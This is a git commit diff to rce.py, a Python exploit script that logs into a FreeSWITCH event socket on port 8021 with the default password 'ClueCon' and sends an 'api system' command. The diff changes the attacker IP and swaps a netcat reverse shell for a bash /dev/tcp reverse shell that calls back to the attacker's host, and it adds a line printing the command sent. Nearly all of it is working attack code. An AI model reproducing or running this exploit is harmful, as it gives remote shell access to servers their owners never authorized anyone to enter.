5fb84241a37087e5236cbfbdddd1d8acee6eb878
ShadowByte <155693555+ShadowByte1@users.noreply.github.com>
2024-10-16 09:21:20 +1100

    Update rce.py

--- rce.py
+++ rce.py
@@ -9,12 +9,12 @@ if len(sys.argv) != 2:
     sys.exit(1)
 
 ADDRESS = sys.argv[1]
-REVERSE_IP = '192.168.152.151'  # Attacker IP
+REVERSE_IP = '192.168.45.193'  # Attacker IP
 REVERSE_PORT = '4444'  # Attacker Port
 PASSWORD = 'ClueCon'  # Default password for FreeSWITCH
 
-# Define reverse shell command
-CMD = f'nc {REVERSE_IP} {REVERSE_PORT} -e /bin/bash'
+# Define bash reverse shell command
+CMD = f'/bin/bash -i >& /dev/tcp/{REVERSE_IP}/{REVERSE_PORT} 0>&1'
 
 s = socket(AF_INET, SOCK_STREAM)
 s.connect((ADDRESS, 8021))
@@ -25,6 +25,7 @@ if b'auth/request' in response:
     response = s.recv(1024)
     if b'+OK accepted' in response:
         print('Authenticated')
+        print(f'Sending command: api system {CMD}')
         # Sending reverse shell command
         s.send(bytes(f'api system {CMD}\n\n', 'utf8'))
         response = s.recv(8096).decode()
